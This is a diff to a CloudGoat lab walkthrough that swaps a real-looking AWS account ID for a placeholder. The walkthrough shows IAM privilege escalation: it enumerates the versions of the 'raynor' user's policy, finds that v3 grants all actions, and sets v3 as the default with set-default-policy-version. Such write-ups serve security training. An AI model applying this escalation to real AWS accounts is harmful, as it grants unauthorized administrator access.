@@ -29,12 +29,12 @@ Lets checkout the policies that are attached to our user and the inline policies
 ![list policies](image-1.png)
 We can see that we have one polilcy - `cg-raynor-policy-cgid3j52g8t9w5`. Lets try to get that policy. For that, first we need the default version.
 ```json
-//aws iam get-policy --profile raynor --policy-arn "arn:aws:iam::139343766080:policy/cg-raynor-policy-cgid3j52g8t9w5"
+//aws iam get-policy --profile raynor --policy-arn "arn:aws:iam::1234567890:policy/cg-raynor-policy-cgid3j52g8t9w5"
 {
     "Policy": {
         "PolicyName": "cg-raynor-policy-cgid3j52g8t9w5",
         "PolicyId": "ANPASA4MJEJAHRPESWPFA",
-        "Arn": "arn:aws:iam::139343766080:policy/cg-raynor-policy-cgid3j52g8t9w5",
+        "Arn": "arn:aws:iam::1234567890:policy/cg-raynor-policy-cgid3j52g8t9w5",
         "Path": "/",
         "DefaultVersionId": "v1",
         "AttachmentCount": 1,
@@ -60,7 +60,7 @@ We can see that we have one polilcy - `cg-raynor-policy-cgid3j52g8t9w5`. Lets tr
 The default version is "v1"
 
 ```json
-//aws iam get-policy-version --profile raynor --policy-arn "arn:aws:iam::139343766080:policy/cg-raynor-policy-cgid3j52g8t9w5" --version-id v1
+//aws iam get-policy-version --profile raynor --policy-arn "arn:aws:iam::1234567890:policy/cg-raynor-policy-cgid3j52g8t9w5" --version-id v1
 {
     "PolicyVersion": {
         "Document": {
@@ -89,7 +89,7 @@ We are allowed iam:Get*, iam:List* and iam:SetDefaultPolicyVersion on all resour
 
 For that lets try to see the other versions of the same policy;
 ```json
-//aws iam get-policy-version --profile raynor --policy-arn "arn:aws:iam::139343766080:policy/cg-raynor-policy-cgid3j52g8t9w5" --version-id v2
+//aws iam get-policy-version --profile raynor --policy-arn "arn:aws:iam::1234567890:policy/cg-raynor-policy-cgid3j52g8t9w5" --version-id v2
 {
     "PolicyVersion": {
         "Document": {
@@ -115,7 +115,7 @@ For that lets try to see the other versions of the same policy;
 }
 ```
 ```json
-//aws iam get-policy-version --profile raynor --policy-arn "arn:aws:iam::139343766080:policy/cg-raynor-policy-cgid3j52g8t9w5" --version-id v3
+//aws iam get-policy-version --profile raynor --policy-arn "arn:aws:iam::1234567890:policy/cg-raynor-policy-cgid3j52g8t9w5" --version-id v3
 {
     "PolicyVersion": {
         "Document": {
@@ -136,7 +136,7 @@ For that lets try to see the other versions of the same policy;
 ```
 This version, "v3" has the policy statement to Allow all Actions on all Resources, which is basically admin privileges so now lets set this policy as the default version.
 ```bash
-aws iam set-default-policy-version --policy-arn "arn:aws:iam::139343766080:policy/cg-raynor-policy-cgid3j52g8t9w5" --version-id v3 --profile raynor
+aws iam set-default-policy-version --policy-arn "arn:aws:iam::1234567890:policy/cg-raynor-policy-cgid3j52g8t9w5" --version-id v3 --profile raynor
 ```
 After that when we try to get the policy, we can see that the default version has changed and the Scenario Goal is achieved.
 ![goal achieved](image-2.png)
